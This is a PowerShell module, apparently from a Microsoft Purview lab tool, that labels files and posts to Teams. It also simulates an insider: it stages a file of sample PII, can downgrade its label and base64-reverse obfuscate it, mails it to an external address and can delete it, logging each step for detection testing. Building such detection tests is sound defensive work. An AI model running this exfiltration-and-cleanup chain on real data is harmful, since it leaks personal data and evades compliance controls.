# =============================================================================
# PURVIEW INTEGRATION - Labels, Teams, DLP awareness, compliance
# =============================================================================
$script:labelCache    = $null
$script:teamCache     = $null
$script:teamsConfigWarned = $false
$script:teamsPostFailures = 0
$script:teamsPostWarnings = 0
$script:teamsLastPostError = ''
$script:lastLabelError = ''

function Get-SensitivityLabels {
    param([string]$Token)
    if ($script:labelCache) { return $script:labelCache }
    try {
        $resp = Invoke-Graph -Token $Token -Uri 'https://graph.microsoft.com/beta/me/informationProtection/policy/labels'
        $script:labelCache = $resp.value
        Write-Output "  [LABELS] Cached $($resp.value.Count) sensitivity labels"
    }
    catch {
        Write-Warning "  [LABELS] Failed to load: $($_.Exception.Message)"
        $script:labelCache = @()
    }
    $script:labelCache
}

function Get-LabelName {
    param($Label)
    if (-not $Label) { return '' }
    if ($Label.displayName) { return ([string]$Label.displayName).Trim() }
    if ($Label.name) { return ([string]$Label.name).Trim() }
    return ''
}

function Get-LabelParentName {
    param($Label)
    if (-not $Label -or -not $Label.parent) { return '' }
    if ($Label.parent.displayName) { return ([string]$Label.parent.displayName).Trim() }
    if ($Label.parent.name) { return ([string]$Label.parent.name).Trim() }
    return ''
}

function Test-LabelMatchesName {
    param($Label, [string]$TargetName)
    if (-not $Label -or [string]::IsNullOrWhiteSpace($TargetName)) { return $false }

    $target = $TargetName.Trim()
    $labelName = Get-LabelName -Label $Label
    $parentName = Get-LabelParentName -Label $Label

    if ($labelName -eq $target) { return $true }
    if ($labelName -like "*$target*") { return $true }

    if ($target -match '/') {
        $parts = @($target -split '/' | ForEach-Object { $_.Trim() } | Where-Object { $_ })
        if ($parts.Count -ge 2) {
            $targetParent = $parts[0]
            $targetLeaf = $parts[-1]
            if ($labelName -eq $targetLeaf -and $parentName -eq $targetParent) { return $true }
            if ($labelName -like "*$targetLeaf*" -and $parentName -like "*$targetParent*") { return $true }
        }
    }

    return $false
}

function Resolve-LabelForFile {
    param([string]$Dept, [string]$FileType, [array]$Labels)
    $rules = $labelRules[$Dept]
    if (-not $rules) { return $null }
    $targetName = if ($rules.High -contains $FileType) { $rules.HighLabel } else { $rules.DefaultLabel }
    $match = $Labels | Where-Object { Test-LabelMatchesName -Label $_ -TargetName $targetName }
    if ($match -is [array]) { $match = $match | Select-Object -First 1 }
    $match
}

function Apply-FileLabel {
    param([string]$Token, [string]$SiteId, [string]$ItemId, [string]$LabelId, [string]$LabelName)
    if (-not $LabelId -or -not $ItemId) { return $false }
    $script:lastLabelError = ''
    $body = @{
        sensitivityLabelId = $LabelId
        assignmentMethod   = 'standard'
        justificationText  = "Classification departementale: $LabelName"
    }
    try {
        Invoke-Graph -Token $Token -Method POST `
            -Uri "https://graph.microsoft.com/beta/sites/$SiteId/drive/items/$ItemId/assignSensitivityLabel" `
            -Body $body | Out-Null
        return $true
    }
    catch {
        $script:lastLabelError = if ($_.ErrorDetails.Message) { $_.ErrorDetails.Message } else { $_.Exception.Message }
        Write-Warning "    [LABEL] Apply failed: $script:lastLabelError"
        return $false
    }
}

function Push-LabelActivity {
    param(
        [string]$AgentUPN,
        [string]$AgentName,
        [string]$Department,
        [string]$Action,
        [string]$TargetName,
        [string]$TargetPath,
        [string]$TargetType = 'File',
        [string]$LabelName = '',
        [string]$LabelId = '',
        [string]$PreviousLabelName = '',
        [string]$PreviousLabelId = '',
        [string]$Outcome = 'Success',
        [string]$ErrorMessage = '',
        [hashtable]$ExtraProperties = @{}
    )

    $changeType = switch ($Action) {
        'SensitivityLabelApplied' { 'applied' }
        'SensitivityLabelChanged' { 'changed' }
        'SensitivityLabelRemoved' { 'removed' }
        'SensitivityLabelApplyFailed' { 'apply_failed' }
        default { 'unknown' }
    }

    $props = @{
        Service = 'Microsoft Purview'
        Workload = 'InformationProtection'
        Action = $Action
        LabelChangeType = $changeType
        TargetName = $TargetName
        TargetType = $TargetType
        TargetPath = $TargetPath
        SensitivityLabel = $LabelName
        SensitivityLabelId = $LabelId
        PreviousSensitivityLabel = $PreviousLabelName
        PreviousSensitivityLabelId = $PreviousLabelId
        Outcome = $Outcome
        ErrorMessage = $ErrorMessage
    }
    foreach ($key in $ExtraProperties.Keys) {
        if (-not [string]::IsNullOrWhiteSpace([string]$key)) { $props[$key] = $ExtraProperties[$key] }
    }

    $detailLabel = if ($LabelName) { $LabelName } else { 'none' }
    Push-AgentActivity -AgentUPN $AgentUPN -AgentName $AgentName -Department $Department `
        -ActivityType 'sensitivity_label' -Detail "$Action | $TargetName | $detailLabel" `
        -Properties $props
}

function Get-LabelByName {
    param([array]$Labels, [string[]]$Names)
    foreach ($name in $Names) {
        $match = $Labels | Where-Object { Test-LabelMatchesName -Label $_ -TargetName $name } | Select-Object -First 1
        if ($match) { return $match }
    }
    return $null
}

function Invoke-DevonInsiderRiskSequence {
    param($Agent, [string]$Token, [string]$UserUpn)

    if (-not $spoSiteId) {
        Write-Warning "    [IRM] AgentSpoSiteId not configured; skipping Devon IRM sequence."
        return 0
    }

    $scenarios = @(
        @{ Name='Download from Microsoft 365 location, obfuscate, then exfiltrate'; Archive=$false; Obfuscate=$true;  Downgrade=$false; Delete=$false; Source='Microsoft365' }
        @{ Name='Download from Microsoft 365 location, obfuscate, exfiltrate, then delete'; Archive=$false; Obfuscate=$true;  Downgrade=$false; Delete=$true;  Source='Microsoft365' }
        @{ Name='Archive, obfuscate, then exfiltrate'; Archive=$true;  Obfuscate=$true;  Downgrade=$false; Delete=$false; Source='Microsoft365' }
        @{ Name='Archive, obfuscate, exfiltrate, then delete'; Archive=$true;  Obfuscate=$true;  Downgrade=$false; Delete=$true;  Source='Microsoft365' }
        @{ Name='Downgrade or remove label then exfiltrate'; Archive=$false; Obfuscate=$false; Downgrade=$true;  Delete=$false; Source='Microsoft365' }
        @{ Name='Downgrade or remove label, download, obfuscate, then exfiltrate'; Archive=$false; Obfuscate=$true;  Downgrade=$true;  Delete=$false; Source='Microsoft365' }
        @{ Name='Downgrade or remove label, download, exfiltrate, then delete'; Archive=$false; Obfuscate=$false; Downgrade=$true;  Delete=$true;  Source='Microsoft365' }
        @{ Name='Download from unallowed domain, obfuscate, then exfiltrate'; Archive=$false; Obfuscate=$true;  Downgrade=$false; Delete=$false; Source='UnallowedDomain' }
    )
    $scenario = $scenarios | Get-Random
    $caseId = "IRM-DEVON-$((Get-Date).ToString('yyyyMMdd-HHmmss'))-$(Get-Random -Minimum 100 -Maximum 999)"
    $folder = 'Insider Risk Devon'
    $fileName = "${caseId}_support_exports.txt"
    $targetPath = "$folder/$fileName"
    $externalRecipient = 'devon.reyes.exfil@outlook.com'
    $eventCount = 0

    $content = @"
Case: $caseId
Actor: $($Agent.Name) <$UserUpn>
Scenario: $($scenario.Name)
Source: $($scenario.Source)

Customer escalation export
Customer: Contoso Retail Services
Contact: Morgan Lee, morgan.lee@example.com, +1 206 555 0174
Employee: Jordan Avery
social security number: 384-29-5187
bank routing number: 021000021
bank account number: 492017388201
Support case: SR-948211
Notes: Raw customer support evidence copied for external AI triage and off-platform review.
"@
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
    $labels = Get-SensitivityLabels -Token $Token
    $highLabel = Get-LabelByName -Labels $labels -Names @('Highly Confidential/All Employees','Confidential/All Employees','Confidential')
    $lowLabel = Get-LabelByName -Labels $labels -Names @('General/All Employees','General')

    try {
        $uploadUri = "https://graph.microsoft.com/v1.0/sites/$spoSiteId/drive/root:/$folder/${fileName}:/content"
        $uploadResult = Invoke-Graph -Token $Token -Method PUT -Uri $uploadUri -Body $bytes -ContentType 'text/plain'
        Write-Output "    [IRM] Uploaded source evidence: $targetPath"

        $labelApplied = ''
        if ($highLabel -and $uploadResult.id) {
            $highLabelName = Get-LabelName -Label $highLabel
            if (Apply-FileLabel -Token $Token -SiteId $spoSiteId -ItemId $uploadResult.id -LabelId $highLabel.id -LabelName $highLabelName) {
                $labelApplied = $highLabelName
                Write-Output "    [IRM] High label applied: $labelApplied"
                Push-LabelActivity -AgentUPN $UserUpn -AgentName $Agent.Name -Department $Agent.Dept `
                    -Action 'SensitivityLabelApplied' -TargetName $fileName -TargetPath $targetPath `
                    -LabelName $highLabelName -LabelId $highLabel.id `
                    -ExtraProperties @{ IRMScenario = $scenario.Name; IRMIndicator = 'Sensitive file staged' }
                $eventCount++
            } else {
                Push-LabelActivity -AgentUPN $UserUpn -AgentName $Agent.Name -Department $Agent.Dept `
                    -Action 'SensitivityLabelApplyFailed' -TargetName $fileName -TargetPath $targetPath `
                    -LabelName $highLabelName -LabelId $highLabel.id -Outcome 'Failed' -ErrorMessage $script:lastLabelError `
                    -ExtraProperties @{ IRMScenario = $scenario.Name; IRMIndicator = 'Sensitive file staged' }
                $eventCount++
            }
        }

        Push-AgentActivity -AgentUPN $UserUpn -AgentName $Agent.Name -Department $Agent.Dept `
            -ActivityType 'insider_risk' -Detail "$($scenario.Name) | Created sensitive source file" `
            -PromptContent $scenario.Name -ResponseContent $content `
            -Properties @{
                Service = 'SharePoint Online'
                Action = 'CreatedSensitiveFile'
                Workload = 'SharePoint'
                TargetName = $fileName
                TargetType = 'File'
                TargetPath = $targetPath
                SensitivityLabel = $labelApplied
                IRMScenario = $scenario.Name
                IRMIndicator = 'Sensitive file staged'
                Outcome = 'Success'
            }
        $eventCount++

        $downloaded = Invoke-Graph -Token $Token -Method GET -Uri "https://graph.microsoft.com/v1.0/sites/$spoSiteId/drive/items/$($uploadResult.id)/content" -ContentType 'text/plain'
        $downloadedText = if ($downloaded) { [string]$downloaded } else { $content }
        Write-Output "    [IRM] Downloaded from Microsoft 365 location: $fileName"
        Push-AgentActivity -AgentUPN $UserUpn -AgentName $Agent.Name -Department $Agent.Dept `
            -ActivityType 'insider_risk' -Detail "$($scenario.Name) | Download from Microsoft 365 location" `
            -PromptContent $scenario.Name -ResponseContent $downloadedText `
            -Properties @{
                Service = 'SharePoint Online'
                Action = 'DownloadedFromM365'
                Workload = 'SharePoint'
                TargetName = $fileName
                TargetType = 'File'
                TargetPath = $targetPath
                IRMScenario = $scenario.Name
                IRMIndicator = 'Download from Microsoft 365 location'
                Outcome = 'Success'
            }
        $eventCount++

        if ($scenario.Downgrade -and $lowLabel -and $uploadResult.id) {
            $lowLabelName = Get-LabelName -Label $lowLabel
            if (Apply-FileLabel -Token $Token -SiteId $spoSiteId -ItemId $uploadResult.id -LabelId $lowLabel.id -LabelName $lowLabelName) {
                Write-Output "    [IRM] Label downgraded: $labelApplied -> $lowLabelName"
                Push-LabelActivity -AgentUPN $UserUpn -AgentName $Agent.Name -Department $Agent.Dept `
                    -Action 'SensitivityLabelChanged' -TargetName $fileName -TargetPath $targetPath `
                    -PreviousLabelName $labelApplied -PreviousLabelId $highLabel.id `
                    -LabelName $lowLabelName -LabelId $lowLabel.id `
                    -ExtraProperties @{ IRMScenario = $scenario.Name; IRMIndicator = 'Downgrade or remove label' }
                $eventCount++
                Push-AgentActivity -AgentUPN $UserUpn -AgentName $Agent.Name -Department $Agent.Dept `
                    -ActivityType 'insider_risk' -Detail "$($scenario.Name) | Downgrade or remove label" `
                    -Properties @{
                        Service = 'Microsoft Purview'
                        Action = 'SensitivityLabelDowngraded'
                        Workload = 'InformationProtection'
                        TargetName = $fileName
                        TargetType = 'File'
                        TargetPath = $targetPath
                        PreviousSensitivityLabel = $labelApplied
                        SensitivityLabel = $lowLabelName
                        IRMScenario = $scenario.Name
                        IRMIndicator = 'Downgrade or remove label'
                        Outcome = 'Success'
                    }
                $eventCount++
            }
        }

        $activeItemId = $uploadResult.id
        $activeName = $fileName
        $activePath = $targetPath
        $activeBytes = $bytes

        if ($scenario.Archive) {
            $archiveName = "${caseId}_archive.zip"
            $archivePath = "$folder/$archiveName"
            $archiveText = "PK-LAB-ARCHIVE`nOriginal=$fileName`n`n$downloadedText"
            $activeBytes = [System.Text.Encoding]::UTF8.GetBytes($archiveText)
            $archiveResult = Invoke-Graph -Token $Token -Method PUT `
                -Uri "https://graph.microsoft.com/v1.0/sites/$spoSiteId/drive/root:/$folder/${archiveName}:/content" `
                -Body $activeBytes -ContentType 'application/zip'
            $activeItemId = $archiveResult.id
            $activeName = $archiveName
            $activePath = $archivePath
            Write-Output "    [IRM] Archive created: $archivePath"
            Push-AgentActivity -AgentUPN $UserUpn -AgentName $Agent.Name -Department $Agent.Dept `
                -ActivityType 'insider_risk' -Detail "$($scenario.Name) | Archive created" `
                -Properties @{
                    Service = 'SharePoint Online'
                    Action = 'ArchiveCreated'
                    Workload = 'SharePoint'
                    TargetName = $archiveName
                    TargetType = 'Archive'
                    TargetPath = $archivePath
                    IRMScenario = $scenario.Name
                    IRMIndicator = 'Archive then exfiltrate'
                    Outcome = 'Success'
                }
            $eventCount++
        }

        if ($scenario.Obfuscate) {
            $obfuscatedName = "${caseId}_payload.dat"
            $obfuscatedPath = "$folder/$obfuscatedName"
            $encoded = [Convert]::ToBase64String($activeBytes)
            $encodedChars = $encoded.ToCharArray()
            [array]::Reverse($encodedChars)
            $obfuscatedText = -join $encodedChars
            $activeBytes = [System.Text.Encoding]::UTF8.GetBytes($obfuscatedText)
            $obfuscatedResult = Invoke-Graph -Token $Token -Method PUT `
                -Uri "https://graph.microsoft.com/v1.0/sites/$spoSiteId/drive/root:/$folder/${obfuscatedName}:/content" `
                -Body $activeBytes -ContentType 'application/octet-stream'
            $activeItemId = $obfuscatedResult.id
            $activeName = $obfuscatedName
            $activePath = $obfuscatedPath
            Write-Output "    [IRM] Obfuscated payload created: $obfuscatedPath"
            Push-AgentActivity -AgentUPN $UserUpn -AgentName $Agent.Name -Department $Agent.Dept `
                -ActivityType 'insider_risk' -Detail "$($scenario.Name) | Obfuscation" `
                -Properties @{
                    Service = 'SharePoint Online'
                    Action = 'Obfuscated'
                    Workload = 'SharePoint'
                    TargetName = $obfuscatedName
                    TargetType = 'ObfuscatedPayload'
                    TargetPath = $obfuscatedPath
                    IRMScenario = $scenario.Name
                    IRMIndicator = 'Obfuscate'
                    Outcome = 'Success'
                }
            $eventCount++
        }

        $mailBody = @{
            message = @{
                subject = "$caseId - support export review"
                body = @{ contentType = 'Text'; content = "External review package for $caseId. Scenario: $($scenario.Name)." }
                toRecipients = @(@{ emailAddress = @{ address = $externalRecipient } })
                attachments = @(
                    @{
                        '@odata.type' = '#microsoft.graph.fileAttachment'
                        name = $activeName
                        contentType = 'application/octet-stream'
                        contentBytes = [Convert]::ToBase64String($activeBytes)
                    }
                )
            }
            saveToSentItems = $true
        }
        Invoke-Graph -Token $Token -Method POST -Uri 'https://graph.microsoft.com/v1.0/me/sendMail' -Body $mailBody | Out-Null
        Write-Output "    [IRM] Exfiltrated to external recipient: $externalRecipient"
        Push-AgentActivity -AgentUPN $UserUpn -AgentName $Agent.Name -Department $Agent.Dept `
            -ActivityType 'insider_risk' -Detail "$($scenario.Name) | Exfiltrate to external email" `
            -Properties @{
                Service = 'Exchange Online'
                Action = 'ExfiltratedExternalEmail'
                Workload = 'Exchange'
                TargetName = $activeName
                TargetType = 'EmailAttachment'
                TargetPath = $activePath
                RecipientUPN = $externalRecipient
                IRMScenario = $scenario.Name
                IRMIndicator = 'Exfiltrate'
                Outcome = 'Success'
            }
        $eventCount++

        if ($scenario.Delete -and $activeItemId) {
            Invoke-Graph -Token $Token -Method DELETE -Uri "https://graph.microsoft.com/v1.0/sites/$spoSiteId/drive/items/$activeItemId" | Out-Null
            Write-Output "    [IRM] Deleted post-exfiltration artifact: $activeName"
            Push-AgentActivity -AgentUPN $UserUpn -AgentName $Agent.Name -Department $Agent.Dept `
                -ActivityType 'insider_risk' -Detail "$($scenario.Name) | Delete after exfiltration" `
                -Properties @{
                    Service = 'SharePoint Online'
                    Action = 'DeletedAfterExfiltration'
                    Workload = 'SharePoint'
                    TargetName = $activeName
                    TargetType = 'File'
                    TargetPath = $activePath
                    IRMScenario = $scenario.Name
                    IRMIndicator = 'Delete'
                    Outcome = 'Success'
                }
            $eventCount++
        }

        Write-Output "    [IRM] Devon scenario completed: $($scenario.Name) ($eventCount events)"
        return $eventCount
    } catch {
        Write-Warning "    [IRM] Devon scenario failed: $($_.Exception.Message)"
        return $eventCount
    }
}

function Get-TeamAndChannels {
    # NOTE: populates $script:teamCache and returns NOTHING -- callers read the
    # script variable. Returning the cache while also using Write-Output made
    # the captured value an [object[]] of log lines + hashtable, and the
    # one-time [TEAMS] log lines never reached the job output.
    param([string]$Token)
    if ($script:teamCache) { return }
    if (-not $teamsGroupId) {
        if (-not $script:teamsConfigWarned) {
            Write-Warning "  [TEAMS] AgentTeamsGroupId not configured -- skipping Teams"
            $script:teamsConfigWarned = $true
        }
        return
    }
    # Primary: use pre-resolved channel mapping from AA variable (no Graph call needed)
    if ($teamsChannelsJson) {
        try {
            $chMap = $teamsChannelsJson | ConvertFrom-Json
            $script:teamCache = @{ TeamId = $teamsGroupId; Channels = @{} }
            foreach ($prop in $chMap.PSObject.Properties) {
                $script:teamCache.Channels[$prop.Name] = $prop.Value
            }
            Write-Information "  [TEAMS] Loaded $($script:teamCache.Channels.Count) channels from config" -InformationAction Continue
            return
        } catch {
            Write-Warning "  [TEAMS] Failed to parse AgentTeamsChannels: $($_.Exception.Message)"
        }
    }
    # Fallback: resolve via Graph API (requires Channel.ReadBasic.All)
    try {
        $channels = Invoke-Graph -Token $Token -Uri "https://graph.microsoft.com/v1.0/teams/$teamsGroupId/channels"
        $script:teamCache = @{ TeamId = $teamsGroupId; Channels = @{} }
        foreach ($ch in $channels.value) {
            $script:teamCache.Channels[$ch.displayName] = $ch.id
        }
        Write-Information "  [TEAMS] Resolved team $teamsGroupId with $($channels.value.Count) channels" -InformationAction Continue
    }
    catch {
        Write-Warning "  [TEAMS] Resolve failed: $($_.Exception.Message)"
    }
}

function Register-TeamsPostFailure {
    # Track Teams posting failures for the end-of-run summary and emit capped
    # warnings (403 on every post used to be swallowed silently, hiding broken
    # ChannelMessage.Send permissions for entire runs).
    param([string]$Context, [string]$Message)
    $script:teamsPostFailures++
    $script:teamsLastPostError = $Message
    if ($script:teamsPostWarnings -lt 3) {
        $script:teamsPostWarnings++
        Write-Warning "  [TEAMS] Post failed ($Context): $Message"
        if ($script:teamsPostWarnings -eq 3) {
            Write-Warning "  [TEAMS] Further Teams post failure warnings suppressed (totals reported at end of run)"
        }
    }
}

function Post-TeamsActivity {
    param([string]$Token, [string]$Dept, [string]$HtmlContent)
    Get-TeamAndChannels -Token $Token
    $teamInfo = $script:teamCache
    if (-not $teamInfo) { return $false }
    $channelId = $teamInfo.Channels[$Dept]
    if (-not $channelId) { $channelId = $teamInfo.Channels['General'] }
    if (-not $channelId) { return $false }
    $msg = @{ body = @{ contentType = 'html'; content = $HtmlContent } }
    try {
        Invoke-Graph -Token $Token -Method POST `
            -Uri "https://graph.microsoft.com/v1.0/teams/$($teamInfo.TeamId)/channels/$channelId/messages" `
            -Body $msg | Out-Null
        return $true
    }
    catch {
        # Best effort -- Teams posting is optional. 403 is common on MCAPS tenants
        # where ChannelMessage.Send is restricted by CA policies on ROPC tokens.
        # Failures are now counted + surfaced (capped) instead of swallowed.
        Register-TeamsPostFailure -Context "channel /$Dept" -Message $_.Exception.Message
        return $false
    }
}

function Get-CollaborationTargetForAgent {
    param([string]$Sam)
    if (-not $collaborationSites) { return $null }
    foreach ($prop in $collaborationSites.PSObject.Properties) {
        $site = $prop.Value
        if (@($site.Members) -contains $Sam) { return $site }
    }
    $null
}

function Get-CollaborationChannelId {
    param($ChannelMap, [array]$PreferredNames)
    if (-not $ChannelMap) { return $null }
    foreach ($name in $PreferredNames) {
        $prop = $ChannelMap.PSObject.Properties[$name]
        if ($prop -and $prop.Value) { return $prop.Value }
    }
    $first = $ChannelMap.PSObject.Properties | Select-Object -First 1
    if ($first) { return $first.Value }
    $null
}

function Post-CollaborationActivity {
    param($Target, [string]$Token, [string]$HtmlContent)
    if (-not $Target -or -not $Target.TeamId -or -not $Target.Channels) { return }
    $channelId = Get-CollaborationChannelId -ChannelMap $Target.Channels -PreferredNames @('Shadow AI','Leak Investigations','AI Governance','General')
    if (-not $channelId) { return }
    $msg = @{ body = @{ contentType = 'html'; content = $HtmlContent } }
    try {
        Invoke-Graph -Token $Token -Method POST `
            -Uri "https://graph.microsoft.com/v1.0/teams/$($Target.TeamId)/channels/$channelId/messages" `
            -Body $msg | Out-Null
    } catch {
        Register-TeamsPostFailure -Context "collaboration $($Target.DisplayName)" -Message $_.Exception.Message
    }
}

function Invoke-ExternalAiSimulation {
    param($Agent, [string]$Token, [string]$OaiToken, [string]$UserUpn)
    if ($externalAiServices.Count -eq 0) { return 0 }

    $runtimeAgents = if ($externalAiRuntime -and $externalAiRuntime.agentSams) { @($externalAiRuntime.agentSams) } else { @() }
    $useRealFoundry = $externalAiRuntime -and
        $externalAiRuntime.enabled -eq $true -and
        $externalAiRuntime.mode -eq 'foundry' -and
        ($runtimeAgents -contains $Agent.Sam) -and
        -not [string]::IsNullOrWhiteSpace([string]$externalAiRuntime.endpoint) -and
        -not [string]::IsNullOrWhiteSpace([string]$externalAiRuntime.deploymentName)

    $service = $null
    if ($useRealFoundry -and $externalAiRuntime.serviceName) {
        $service = $externalAiServices | Where-Object { $_.name -eq $externalAiRuntime.serviceName } | Select-Object -First 1
    }
    if (-not $service -and $requestedServices.Count -gt 0) {
        foreach ($requested in $requestedServices) {
            $service = $externalAiServices | Where-Object {
                "$($_.name) $($_.provider) $($_.modelFamily)".ToLowerInvariant() -match [regex]::Escape($requested)
            } | Select-Object -First 1
            if ($service) { break }
        }
    }
    if (-not $service) { $service = $externalAiServices | Get-Random }
    $target = Get-CollaborationTargetForAgent -Sam $Agent.Sam
    $caseId = "DSPM-AI-$((Get-Date).ToString('yyyyMMdd'))-$(Get-Random -Minimum 1000 -Maximum 9999)"
    $prompt = @"
Controlled non-Copilot AI test inside Azure.
Act as $($service.name) ($($service.provider) / $($service.modelFamily)).

User: $($Agent.Name) <$UserUpn>
Case: $caseId
Risk profile: $($service.riskProfile)

Task: analyze whether the following evidence can be pasted into a non-Copilot AI assistant.
Include a concise response, risk classification, and remediation advice.

Evidence sample:
- employee record with social security number 384-22-9147
- direct deposit routing number 021000021 and account number 7788123401
- customer contact jean.dupont@corplab.fr, phone +1 415 555 0198
- source: Teams export and SharePoint incident notes
"@

    $runtimeMode = if ($useRealFoundry) { 'RealFoundry' } else { 'Simulated' }
    $runtimeError = ''
    try {
        if ($useRealFoundry) {
            $response = Invoke-FoundryChatCompletion `
                -Endpoint $externalAiRuntime.endpoint `
                -DeploymentName $externalAiRuntime.deploymentName `
                -SystemPrompt ($Agent.Prompt + "`n`n" + $sitReference) `
                -UserPrompt $prompt -MaxTokens 900 -UserId $UserUpn
        } else {
            $response = Invoke-OAI -OaiToken $OaiToken `
                -SystemPrompt ($Agent.Prompt + "`n`n" + $sitReference) `
                -UserPrompt $prompt -MaxTokens 900 -UserId $UserUpn
        }
    } catch {
        $runtimeError = $_.Exception.Message
        $runtimeMode = if ($useRealFoundry) { 'FoundryFallbackSimulation' } else { 'SimulatedFallback' }
        if ($useRealFoundry -and $externalAiRuntime.fallbackToSimulation -ne $true) { throw }
        $response = "External AI simulation fallback for $caseId. Risk: High. Sensitive data types detected: SSN, bank routing/account number, email, phone. Recommendation: block raw prompt, redact identifiers, retain audit evidence in DSPM review."
    }

    $detail = "$($service.name) | $caseId | $runtimeMode | $($service.riskProfile)"
    Push-AgentActivity -AgentUPN $UserUpn -AgentName $Agent.Name -Department $Agent.Dept `
        -ActivityType 'external_ai' -Detail $detail `
        -PromptContent $prompt -ResponseContent $response `
        -Properties @{
            Service = $service.name
            Provider = $service.provider
            ModelFamily = $service.modelFamily
            Action = 'Prompted'
            Workload = 'ExternalAI'
            TargetName = $caseId
            TargetType = 'AIInteraction'
            TargetPath = if ($target) { $target.TeamName } else { 'Unmapped collaboration team' }
            RiskProfile = $service.riskProfile
            RuntimeMode = $runtimeMode
            FoundryEndpoint = if ($useRealFoundry) { $externalAiRuntime.endpoint } else { '' }
            FoundryDeployment = if ($useRealFoundry) { $externalAiRuntime.deploymentName } else { '' }
            RuntimeError = $runtimeError
            ContentDepartment = $Agent.ContentDept
            Outcome = 'Success'
        }

    if ($target -and $target.SiteId) {
        $fileName = "ShadowAI_$($Agent.Sam)_$caseId.md"
        $artifact = @"
# $caseId

User: $($Agent.Name) <$UserUpn>
Service: $($service.name)
Provider: $($service.provider)
Model family: $($service.modelFamily)
Runtime mode: $runtimeMode
Risk profile: $($service.riskProfile)
Foundry deployment: $(if ($useRealFoundry) { $externalAiRuntime.deploymentName } else { 'N/A' })

## Prompt
$prompt

## Response
$response

## DSPM Notes
Controlled non-Copilot AI interaction for data leakage monitoring. Review in Purview DSPM for AI, Teams DLP, SharePoint DLP, and ADX where ActivityType == 'external_ai'.
"@
        try {
            Invoke-Graph -Token $Token -Method PUT `
                -Uri "https://graph.microsoft.com/v1.0/sites/$($target.SiteId)/drive/root:/${fileName}:/content" `
                -Body ([System.Text.Encoding]::UTF8.GetBytes($artifact)) `
                -ContentType 'text/markdown' | Out-Null
            Write-Output "    [EXTERNAL-AI] Evidence uploaded: $($target.DisplayName)/$fileName"
        } catch {
            Write-Warning "    [EXTERNAL-AI] Evidence upload failed: $($_.Exception.Message)"
        }

        $html = "<b>$($Agent.Name)</b> used <b>$($service.name)</b> for <b>$caseId</b><br/><small>Runtime: $runtimeMode. Risk: $($service.riskProfile). Evidence stored in SharePoint and ADX telemetry.</small>"
        Post-CollaborationActivity -Target $target -Token $Token -HtmlContent $html
    }

    Write-Output "    [EXTERNAL-AI] $($service.name) | $caseId | $runtimeMode"
    1
}

function Get-UnlabeledFiles {
    param([string]$Token, [string]$SiteId, [string]$Folder)
    try {
        $uri = "https://graph.microsoft.com/beta/sites/$SiteId/drive/root:/${Folder}:/children?`$select=id,name,sensitivityLabel,createdDateTime&`$top=50"
        $items = Invoke-Graph -Token $Token -Uri $uri
        $unlabeled = $items.value | Where-Object { -not $_.sensitivityLabel -or -not $_.sensitivityLabel.labelId }
        $unlabeled
    }
    catch {
        Write-Warning "    [SCAN] Scan failed for ${Folder}: $($_.Exception.Message)"
        @()
    }
}

